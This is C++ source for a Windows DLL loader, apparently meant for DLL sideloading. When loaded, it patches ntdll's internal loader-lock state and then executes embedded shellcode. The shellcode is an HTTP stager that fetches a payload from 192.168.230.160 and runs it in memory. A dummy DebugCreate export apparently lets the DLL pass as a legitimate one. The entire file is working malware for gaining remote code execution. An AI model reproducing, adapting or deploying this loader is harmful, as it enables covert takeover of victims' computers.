﻿#include <Windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* RtlGetVersionFunc)(_Out_ PVOID VersionInformation);

DWORD GetWindowsBuildNumber() {
    OSVERSIONINFOEXW osInfo;
    memset(&osInfo, 0, sizeof(OSVERSIONINFOEXW));
    RtlGetVersionFunc pRtlGetVersionFunc = (RtlGetVersionFunc)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (pRtlGetVersionFunc(&osInfo) == 0) {
        return osInfo.dwBuildNumber;
    }
    return NULL;
}

void runShellcode() {
#ifdef _WIN64
    unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x77\x62\x33\x51\x00\xbe\x54\x9b\xd2\x7c\xfa\x60\x3e\xf5\x66\xf0\x09\xea\x24\x0f\xba\x3f\x08\x24\xf9\x38\x21\xe0\x96\x96\xd8\x89\x1e\x48\x7c\xa1\xf9\xd9\xcc\x90\x0e\x6f\xd5\x45\x57\x5b\xfb\xdb\xa3\x70\x03\xb0\xee\xeb\xd9\x79\x98\x45\x23\xba\x64\x8a\x94\x74\x50\x18\xdc\xc1\x2b\x20\x0d\x12\x0d\xe7\xa8\x97\x83\x2e\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x30\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x6d\x73\x6e\x20\x4f\x70\x74\x69\x6d\x69\x7a\x65\x64\x49\x45\x38\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\x71\xd2\x43\x20\x55\x08\xd3\x23\x34\xfc\xd2\xd1\xe2\x4f\xec\x22\x44\xc6\x9d\x09\xba\x8b\x26\x94\x39\xfb\xac\x61\xc8\xf8\x04\x70\x46\x24\xda\xb4\x08\x0b\xd2\x41\x5d\x26\xc9\x5c\xdf\xd3\xb4\x5c\x4d\x3a\xa4\x8c\x02\x64\x8c\xfb\xc7\x13\xb4\xb6\xdc\x3a\xef\x24\x38\x22\xb2\x88\x05\xc4\x50\x26\x1d\xb5\x02\x11\x31\xdb\x03\xc1\xf4\xb5\xe7\x8b\x84\x82\xea\xca\xad\xd9\x1e\x3f\xe2\x56\x79\xc7\xd8\x45\x13\xd4\x68\x50\xf9\x5f\x73\x5b\xf2\xb3\x67\x66\xec\x43\xb7\x41\x14\x6b\x0c\xcc\x26\x23\x3f\x86\x3a\xc1\x36\x0e\x9e\x74\xb0\x54\x2b\x4f\xa4\x6f\x75\x9e\xb6\x0b\x57\xa9\xf1\x79\x49\x32\xe5\xf2\x0a\xa9\x6a\x0e\xbe\x15\xd1\x2e\x53\x8d\x29\x3e\xb5\x90\xda\x81\x9c\xfa\x2f\x4c\xd0\x2d\xae\xdb\x13\x1c\xbf\x79\x4a\x6f\x5a\xe9\x62\x4b\x75\xeb\x19\xc8\xb2\x1b\x94\x32\xcb\xab\x62\x24\xf0\x81\x8e\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x33\x30\x2e\x31\x36\x30\x00\x27\xbc\x86\xaa";
#else
    unsigned char buf[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x33\x4c\x65\x78\x00\x1e\x2a\x49\x6f\x20\xa4\x24\x44\x23\xc5\x0f\xee\x14\x50\x02\xcd\x9c\x65\x33\xae\x94\xd0\x66\x47\x44\x06\xb2\x4a\xb6\xe0\xf8\x75\xb4\x21\x57\xb8\x8c\x10\xe5\xe3\x1e\xb6\xf6\xab\x3c\x72\xc6\x88\xcc\xe4\x82\xc9\x2d\xd8\x30\x70\x58\x93\x4b\x02\x38\xcb\xd0\x75\x60\x8e\xf7\x25\x37\x08\xcb\x29\x5e\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x37\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x29\x0d\x0a\x00\xfc\xc9\x44\x0c\xbb\x1e\x52\x72\x6f\x37\xf0\x38\x19\x4f\x76\x23\xef\xcc\x2d\xb2\xed\x0c\x1f\x6b\xc4\xa3\xe3\x1d\x5b\x72\xcc\x44\x57\xbc\x26\x36\x37\x7b\xae\x4b\x30\xed\x07\x07\x0b\x96\xe7\xfe\xbf\xac\x68\xe6\xb5\x4b\x99\x53\x7e\x3f\x9e\x92\x53\xcf\x77\x90\x85\x62\xe5\x36\x90\xe8\x42\xb6\x1b\xee\xed\x22\x81\xb5\x68\x31\x09\xdf\x74\x72\x56\xbb\xb7\xd0\x24\x26\x2c\xd1\x81\x72\x07\x90\xb6\x34\x55\xcc\x78\xd8\x61\x2c\xb5\x70\x50\x08\xb9\xd4\x3a\x89\xbf\xd2\x34\xee\x02\x5d\xf5\xe8\xf8\xd6\x2a\x96\x19\x8a\x7e\x14\x1a\x4e\xbd\x58\xf2\x5c\x6e\xd5\x7e\x08\x1b\x1f\x3d\xd9\xde\xf5\xee\x4e\x80\x1f\xa7\x97\x31\x0c\x34\x6a\xa2\x09\x20\xad\x34\x66\xc4\x6d\x81\x84\x68\x93\x6a\x8c\xc4\xee\xb7\x52\x11\xa0\xb4\x74\xd8\x21\x86\xb8\x4e\x0c\x94\x85\x60\x24\x0a\x67\x20\x8d\x59\x18\x24\x82\xb1\x00\x58\x28\xd0\x78\x15\x35\x4b\x86\x76\x0b\x68\x04\x4b\xf3\xb2\xce\x1f\x0a\x6d\x23\x63\x90\x5e\x10\x14\xab\x67\xe4\x36\x25\xe8\xe6\xc9\x8e\xeb\x22\xfb\x1c\x4d\x9c\x17\x9e\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x33\x30\x2e\x31\x36\x30\x00\x27\xbc\x86\xaa";
#endif

    LPVOID shellcode = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, 0x40);

    memcpy(shellcode, buf, sizeof(buf));

    void(*func)();
    func = (void(*)())shellcode;
    func();
}

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;
typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;
} ANSI_STRING, * PANSI_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG                   Length;
    ULONG                   Initialized;
    PVOID                   SsHandle;
    LIST_ENTRY              InLoadOrderModuleList;
    LIST_ENTRY              InMemoryOrderModuleList;
    LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;
typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    PVOID Handle;
}CURDIR, * PCURDIR;
typedef struct _RTL_DRIVE_LETTER_CURDIR {
    WORD Flags;
    WORD Length;
    ULONG TimeStamp;
    ANSI_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    PVOID ConsoleHandle;
    ULONG ConsoleFlags;
    PVOID StandardInput;
    PVOID StandardOutput;
    PVOID StandardError;
    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
    ULONG EnvironmentSize;
}RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN                 InheritedAddressSpace;
    BOOLEAN                 ReadImageFileExecOptions;
    BOOLEAN                 BeingDebugged;
    BOOLEAN                 Spare;
    HANDLE                  Mutant;
    PVOID                   ImageBase;
    PPEB_LDR_DATA           LoaderData;
    PRTL_USER_PROCESS_PARAMETERS                   ProcessParameters;
    PVOID                   SubSystemData;
    PVOID                   ProcessHeap;
    PVOID                   FastPebLock;
    PVOID                   FastPebLockRoutine;
    PVOID                   FastPebUnlockRoutine;
    ULONG                   EnvironmentUpdateCount;
    PVOID* KernelCallbackTable;
    PVOID                   EventLogSection;
    PVOID                   EventLog;
    PVOID                   FreeList;
    ULONG                   TlsExpansionCounter;
    PVOID                   TlsBitmap;
    ULONG                   TlsBitmapBits[0x2];
    PVOID                   ReadOnlySharedMemoryBase;
    PVOID                   ReadOnlySharedMemoryHeap;
    PVOID* ReadOnlyStaticServerData;
    PVOID                   AnsiCodePageData;
    PVOID                   OemCodePageData;
    PVOID                   UnicodeCaseTableData;
    ULONG                   NumberOfProcessors;
    ULONG                   NtGlobalFlag;
    BYTE                    Spare2[0x4];
    LARGE_INTEGER           CriticalSectionTimeout;
    ULONG                   HeapSegmentReserve;
    ULONG                   HeapSegmentCommit;
    ULONG                   HeapDeCommitTotalFreeThreshold;
    ULONG                   HeapDeCommitFreeBlockThreshold;
    ULONG                   NumberOfHeaps;
    ULONG                   MaximumNumberOfHeaps;
    PVOID** ProcessHeaps;
    PVOID                   GdiSharedHandleTable;
    PVOID                   ProcessStarterHelper;
    PVOID                   GdiDCAttributeList;
    PVOID                   LoaderLock;
    ULONG                   OSMajorVersion;
    ULONG                   OSMinorVersion;
    ULONG                   OSBuildNumber;
    ULONG                   OSPlatformId;
    ULONG                   ImageSubSystem;
    ULONG                   ImageSubSystemMajorVersion;
    ULONG                   ImageSubSystemMinorVersion;
    ULONG                   GdiHandleBuffer[0x22];
    ULONG                   PostProcessInitRoutine;
    ULONG                   TlsExpansionBitmap;
    BYTE                    TlsExpansionBitmapBits[0x80];
    ULONG                   SessionId;
} PEB, * PPEB;

PPEB GetPeb(VOID)
{
#if defined(_WIN64)
    return (PPEB)__readgsqword(0x60);
#elif defined(_WIN32)
    return (PPEB)__readfsdword(0x30);
#endif
}

size_t memFind(BYTE* mem, BYTE* search, size_t memSize, size_t length)
{
    size_t end = length - 1;
    size_t begin = 0;
    BOOL tmp;

    if (memSize < size_t(mem)) {
        //反向搜索
        for (size_t i = 0; size_t(mem) - i >= memSize; i++)
        {
            tmp = TRUE;

            while (begin <= end)
            {
                if ((search[begin] != 0xFF && *(mem - i + begin) != search[begin]) || (search[end] != 0xFF && *(mem - i + end) != search[end]))
                {
                    tmp = FALSE;
                    break;
                }

                begin++;
            }
            if (tmp)
                return size_t(mem) - i;
            else
                begin = 0;
        }
    }
    else {
        for (size_t i = 0; i + size_t(mem) < memSize; i++)
        {
            tmp = TRUE;

            while (begin <= end)
            {
                if ((search[begin] != 0xFF && *(mem + i + begin) != search[begin]) || (search[end] != 0xFF && *(mem + i + end) != search[end]))
                {
                    tmp = FALSE;
                    break;
                }

                begin++;
            }
            if (tmp)
                return size_t(mem) + i;
            else
                begin = 0;
        }
    }

    return 0;
}

BYTE* readSectionData(BYTE* buffer, PDWORD rdataLength, char* secName) {
    PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(buffer) + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        if (strcmp(secName, (char*)sectionHeader[i].Name) == 0) {
            *rdataLength = sectionHeader[i].Misc.VirtualSize;
            return reinterpret_cast<BYTE*>(buffer) + sectionHeader[i].VirtualAddress;
        }
    }

    return 0;
}

size_t GetSkipFileAPIBrokering(VOID)
{
#if defined(_WIN64)
    return __readgsqword(0x30) + 0x17EE;
#elif defined(_WIN32)
    return __readfsdword(0x18) + 0xFCA;
#endif
}

#ifdef _WIN64
//LdrFastFailInLoaderCallout导出函数开始匹配的特征码
unsigned char lock_count_flag[] = { 0x66, 0x21, 0x88, 0xEE, 0x17, 0x00, 0x00 };
//针对没有LdrFastFailInLoaderCallout导出函数的，全局特征码
unsigned char win7_lock_count_flag[] = { 0xF0, 0x44, 0x0F, 0xB1, 0x35, 0xFF, 0xFF, 0xFF, 0xFF, 0x41 };
#else
unsigned char lock_count_flag[] = { 0x66, 0x21, 0x88, 0xCA, 0x0F, 0x00, 0x00, 0xE8 };
unsigned char win7_lock_count_flag[] = { 0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0x8B, 0x75, 0xD8 };
#endif

#ifdef _WIN64
//LdrGetDllFullName导出函数开始匹配的特征码，有两个是为了兼容不同版本系统
unsigned char win10_staic_lock_flag1[] = { 0x48, 0x8B, 0x05, 0xFF, 0xFF, 0xFF, 0x00 };
unsigned char win10_staic_lock_flag2[] = { 0x48, 0x8B, 0x1d, 0xFF, 0xFF, 0xFF, 0x00 };
unsigned char win11_24h2_staic_lock_flag[] = { 0x48, 0x8B, 0x2d, 0xFF, 0xFF, 0xFF, 0x00, 0x65 };
#else
unsigned char win10_staic_lock_flag1[] = { 0x3b, 0x3d };
#endif

#ifdef _WIN32
//上面的修改对server2012下32位程序还无法突破，需要额外解锁
unsigned char server12_staic_lock_flag[] = { 0x64, 0x8B, 0x1D, 0x18, 0x00, 0x00, 0x00, 0x83, 0x65, 0xDC, 0x00, 0xBA };
#endif

VOID UNLOOK()
{
    DWORD buildNumber = GetWindowsBuildNumber();
    HMODULE base = GetModuleHandleA("ntdll.dll");
    DWORD rdataLength;
    BYTE* textData = readSectionData((BYTE*)base, &rdataLength, (char*)".text");

    //适用于win7 server 08以上的系统，需要格外解锁
    size_t addr = memFind(textData, lock_count_flag, (size_t)textData + rdataLength, sizeof(lock_count_flag));
    if (addr != 0)
    {
#ifdef _WIN64
        addr = (size_t)addr + 0x15;
        addr = addr + 5 + *(PDWORD)addr;
#else
        addr = (size_t)addr + 0xe;
        addr = *(PDWORD)addr;
#endif
        * (PDWORD)addr = (*(PDWORD)addr) & 0;

        size_t skipFileAPIBrokeringAddr = GetSkipFileAPIBrokering();
        (*(PWORD)skipFileAPIBrokeringAddr) = (*(PWORD)skipFileAPIBrokeringAddr) & 0xEFFF;
    }

    PPEB Peb = GetPeb();
    HMODULE hModule = GetModuleHandleA("ntdll.dll");
    if (hModule == NULL)
        return;

    typedef NTSTATUS(NTAPI* RTLLEAVECRITICALSECTION)(PRTL_CRITICAL_SECTION CriticalSection);

    RTLLEAVECRITICALSECTION RtlLeaveCriticalSection = NULL;

    RtlLeaveCriticalSection = (RTLLEAVECRITICALSECTION)GetProcAddress((HMODULE)hModule, "RtlLeaveCriticalSection");

    RtlLeaveCriticalSection((PRTL_CRITICAL_SECTION)Peb->LoaderLock);

    //上面代码是解决使用LoadLibrary动态加载DLL的死锁，下面代码是解决静态导入的DLL的死锁问题
    size_t hookAddr = (size_t)GetProcAddress((HMODULE)hModule, "LdrFastFailInLoaderCallout");
    if (hookAddr > 0) {
        //win7 和 08以上系统可以通过LdrFastFailInLoaderCallout导出函数定位到标记位地址
#ifdef _WIN64
        // 适配Win11 24H2
        if (buildNumber >= 26100) {
            hookAddr = hookAddr + 0xB + 5 + *(PDWORD)(hookAddr + 0xB);
        }
        else {
            hookAddr = hookAddr + 0x18 + 5 + *(PDWORD)(hookAddr + 0x18);
        }
#else
        hookAddr = *(PDWORD)(hookAddr + 0x13);
#endif
        * (PDWORD)hookAddr = 2;
    }
    else {
        //win7 和 08以下系统没有LdrFastFailInLoaderCallout导出函数，需要搜索特征码定位到标记位地址
        addr = memFind(textData, win7_lock_count_flag, (size_t)textData + rdataLength, sizeof(win7_lock_count_flag));
        if (addr != 0)
        {
#ifdef _WIN64
            hookAddr = addr + 0x5 + 4 + *(PDWORD)(addr + 0x5);
#else
            hookAddr = *(PDWORD)((size_t)addr + 0x8);
#endif
            * (PDWORD)hookAddr = 2;
        }
    }

    //系统有LdrGetDllFullName导出函数的，需要额外解锁EventMetadata，通过LdrGetDllFullName导出函数定位到标记位地址
    hookAddr = (size_t)GetProcAddress((HMODULE)hModule, "LdrGetDllFullName");
    if (hookAddr > 0) {
#ifdef _WIN64
        // 适配Win11 24H2
        if (buildNumber >= 26100) {
            addr = memFind((BYTE*)hookAddr, (unsigned char*)win11_24h2_staic_lock_flag, (size_t)hookAddr + 0x200, sizeof(win11_24h2_staic_lock_flag));
        } else {
            addr = memFind((BYTE*)hookAddr, win10_staic_lock_flag1, (size_t)hookAddr + 0x80, sizeof(win10_staic_lock_flag1));
        }

        addr = addr > 0 ? addr : memFind((BYTE*)hookAddr, win10_staic_lock_flag2, (size_t)hookAddr + 0x80, sizeof(win10_staic_lock_flag2));
        if (addr != 0)
        {
            hookAddr = addr + 7 + *(PDWORD)(addr + 0x3);
            *(size_t*)(*(size_t*)(*(size_t*)hookAddr + 0x98) + 0x38) += 2;
        }
#else
        addr = memFind((BYTE*)hookAddr, win10_staic_lock_flag1, (size_t)hookAddr + 0x150, sizeof(win10_staic_lock_flag1));
        if (addr != 0)
        {
            hookAddr = *(PDWORD)(addr + 0x2);
            *(size_t*)(*(size_t*)(*(size_t*)hookAddr + 0x50) + 0x20) += 2;
        }

        //处理server2012特殊情况，解锁代码：mov ecx, offset dword_7710F74C inc eax，lock xadd [ecx], eax
        addr = memFind((BYTE*)hookAddr, server12_staic_lock_flag, (size_t)textData + rdataLength, sizeof(server12_staic_lock_flag));
        if (addr != 0)
        {
            hookAddr = *(PDWORD)(addr + sizeof(server12_staic_lock_flag));
            *(PDWORD)hookAddr = 2;
        }
#endif
    }
}

extern "C" __declspec(dllexport) int DebugCreate() {
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        UNLOOK();

        runShellcode();
    }
    return TRUE;
}
